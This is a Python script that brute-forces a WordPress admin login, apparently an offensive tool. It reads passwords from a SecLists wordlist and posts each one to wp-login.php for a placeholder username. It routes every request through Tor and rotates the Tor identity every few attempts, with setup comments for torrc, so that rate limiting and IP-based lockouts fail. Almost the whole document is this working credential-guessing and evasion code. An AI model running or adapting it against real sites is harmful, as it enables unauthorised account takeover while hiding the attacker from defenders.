# First setup torrc

# Generate the hash
# tor --hash-password "yeah right, this is my passwd"

# Add the following lines to /etc/tor/torrc
# ControlPort 9051
# HashedControlPassword 16:31D677E3894FC5F1605641443EA6B60BF0D9F1787A8AA943DE565FD2B0
# CookieAuthentication 1


import sys
import time
import requests

from stem import Signal
from stem.control import Controller

def newid():
  with Controller.from_port(port = 9051) as controller:
    ## passwd here !! - change
    controller.authenticate('BANANE')
    controller.signal(Signal.NEWNYM)

PROXYHOST = 'localhost'
PROXYPORT = 9050

cc = 10

## right click, copy as python xx
url = "https://<URL>:443/wp-login.php"
cookies = {"wordpress_test_cookie": "WP%20Cookie%20check"}
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"}
s = time.perf_counter()

## change wordlist
with open('/opt/cracking/SecLists/Passwords/probable-v2-top12000.txt', 'rb') as wl:
  for l in wl:
    try:
      # yeah dirty and disgusting -- sorry Roby
      ll = l.decode().strip()
      data = {"log": "<USERNAME>", "pwd": ll, "wp-submit": "Log In", "redirect_to": "https://<URL>/wp-admin/", "testcookie": "1"}
      rr = requests.post(url, headers=headers, cookies=cookies, data=data, proxies={'http': 'socks5h://%s:%s' % (PROXYHOST, PROXYPORT), 'https': 'socks5h://%s:%s' % (PROXYHOST, PROXYPORT)}).text
      if 'he password you entered for the username' not in rr:
        print(f'password!! --> {ll}')
      cc += 1

    except Exception as e:
      cc += 1
      if "refused" in str(e):
        # yeah yeah yeah - disgusting I know
        print(f'Missed passwd --> {ll}')
        with open('./missed.txt', 'w+') as mp:
          mp.write(f'{ll}\n')
        cc = 10
      else:
        print(f'Error --> {str(e)}')

    if cc >= 8:
      e = time.perf_counter()
      t = e - s
      ## can modify the timeout in case torrc wants it
      if t < 10:
        print(f'sleeping {10-t}s')
        time.sleep(10-t)

      newid()
      cc = 0
      s = time.perf_counter()
